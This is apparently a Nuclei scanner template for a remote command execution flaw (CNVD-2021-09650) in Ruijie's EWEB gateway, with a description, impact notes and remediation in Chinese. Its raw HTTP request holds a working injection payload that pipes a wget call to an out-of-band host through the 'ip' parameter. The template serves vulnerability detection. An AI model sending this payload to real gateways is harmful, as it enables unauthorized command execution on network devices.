id: CNVD-2021-09650

info:
  name: 锐捷 EWEB 网关平台远程命令执行漏洞（CNVD-2021-09650）
  author: daffainfo,pikpikcu
  severity: critical
  description: |
    锐捷 EWEB 网关平台 `guestIsUp.php` 对参数拼接处理不当，攻击者可通过 `ip` 或 `mac` 参数注入系统命令。模板构造带外请求命令，并通过 Interactsh HTTP 回连确认命令执行。
  impact: |
    - 攻击者可在网关设备上执行系统命令，读取配置、植入后门或改变网络访问策略。
    - 网关被控制后可能影响出口流量、认证策略和内网安全边界。
  remediation: |
    - 升级锐捷 EWEB 网关平台到修复版本，修复访客认证接口命令拼接问题。
    - 禁止公网访问网关管理接口，并对访客认证相关接口做来源限制。
    - 排查设备配置、异常外联和新增账号，必要时恢复可信配置并轮换管理密码。
  reference:
    - http://j0j0xsec.top/2021/04/22/%E9%94%90%E6%8D%B7EWEB%E7%BD%91%E5%85%B3%E5%B9%B3%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/
    - https://github.com/yumusb/EgGateWayGetShell_py/blob/main/eg.py
    - https://www.ruijienetworks.com
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-77
  metadata:
    max-request: 1
  tags: cnvd,cnvd2021,ruijie,rce,vuln

http:
  - raw:
      - |
        POST /guest_auth/guestIsUp.php HTTP/1.1
        Host: {{Hostname}}

        mac=1&ip=127.0.0.1|wget {{interactsh-url}}

    unsafe: true
    matchers:
      - type: word
        part: interactsh_protocol
        name: http
        words:
          - "http"
